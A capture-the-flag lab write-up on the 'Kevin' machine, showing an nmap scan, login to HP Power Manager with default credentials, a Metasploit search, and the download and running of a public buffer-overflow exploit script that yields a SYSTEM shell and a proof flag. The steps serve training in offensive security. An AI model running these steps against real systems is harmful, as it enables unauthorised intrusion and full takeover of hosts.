# CTF Writeup: Kevin

## Lab Description

This lab focuses on exploiting a buffer overflow vulnerability in HP Power Manager v4.2 Build 7 to achieve remote code execution. Learners will use both a Python-based exploit and a Metasploit module to gain SYSTEM-level access on a Windows 7 machine. The exercise highlights buffer overflow exploitation and the risks of using default credentials.

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.122.45
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 12:20 EDT
Warning: 192.168.122.45 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.122.45
Host is up (0.027s latency).
Not shown: 65490 closed tcp ports (reset), 33 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.122.45/index.asp
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2025-11-01T16:21:55+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2025-10-31T16:18:46
|_Not valid after:  2026-05-02T16:18:46
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2025-11-01T16:21:40+00:00
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 4 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-01T09:21:40-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:84:29 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-01T16:21:40
|_  start_date: 2025-11-01T16:19:35
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   24.84 ms 192.168.45.1
2   24.73 ms 192.168.45.254
3   24.88 ms 192.168.251.1
4   25.02 ms 192.168.122.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.21 seconds
```

Reviewing the webpage, we get prompted for login credentials. The default credentials for "HP Power Manager" are admin:admin.

Logged in with those and started exploring the admin panel.

Retrieved version information.

```
HP Power Manager 4.2
```

Loaded up metasploit framework. 

```
msfconsole -q
```

Searched for exploit.

```
msf > search HP Power Manager 4.2

Matching Modules
================

   #  Name                                         Disclosure Date  Rank     Check  Description
   -  ----                                         ---------------  ----     -----  -----------
   0  exploit/windows/http/hp_power_manager_login  2009-11-04       average  No     Hewlett-Packard Power Manager Administration Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/hp_power_manager_login
```

Configured exploit and ran it.

This didn't work --> Let's checkup for manual exploits on github.

```
wget https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py
```

Gave this exploit executables 

```
chmod +x exploit.py
```

ran the exploit.

```
python2 exploit.py 192.168.122.45
[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.122.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Gained shell as NT AUTHORITY\SYSTEM & retrieved proof.txt in C:\Users\Administrator\Desktop

```
126c9bc7ac4d81a8780f36ed64b6b320
```
